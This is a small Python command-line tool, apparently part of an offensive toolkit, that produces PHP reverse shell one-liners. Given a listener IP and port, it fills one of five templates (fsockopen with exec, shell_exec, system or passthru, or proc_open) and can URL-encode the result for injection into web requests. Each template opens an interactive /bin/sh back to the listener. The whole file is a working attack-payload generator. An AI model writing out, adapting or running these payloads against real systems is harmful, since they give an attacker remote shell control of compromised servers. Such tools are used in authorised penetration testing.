import click
from colorama import Fore
from urllib.parse import quote

VARIANTS = {
    "1": ("PHP fsockopen + exec", "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"),
    "2": ("PHP fsockopen + shell_exec", "php -r '$sock=fsockopen(\"{ip}\",{port});shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'"),
    "3": ("PHP fsockopen + system", "php -r '$sock=fsockopen(\"{ip}\",{port});system(\"/bin/sh -i <&3 >&3 2>&3\");'"),
    "4": ("PHP fsockopen + passthru", "php -r '$sock=fsockopen(\"{ip}\",{port});passthru(\"/bin/sh -i <&3 >&3 2>&3\");'"),
    "5": ("PHP proc_open", "php -r '$sock=fsockopen(\"{ip}\",{port});$proc=proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'"),
}

@click.command()
@click.argument("listener_ip")
@click.argument("listener_port")
@click.option("-r", "--raw", is_flag=True, default=False, help="Enable raw output.")
@click.option("-u", "--urlencode", is_flag=True, default=False, help="URL-encode the output.")
@click.option("-v", "--variant", default="1", type=click.Choice(list(VARIANTS.keys())),
              help="1=exec, 2=shell_exec, 3=system, 4=passthru, 5=proc_open")
def command(listener_ip, listener_port, raw, urlencode, variant):
    """Return PHP reverse shell"""
    label, template = VARIANTS[variant]
    cmd = template.format(ip=listener_ip, port=listener_port)
    if urlencode:
        cmd = quote(cmd)
    if not raw:
        click.secho(f"{Fore.LIGHTGREEN_EX}{label}:\n\t{Fore.WHITE}{cmd}")
    else:
        click.secho(cmd, nl=False)
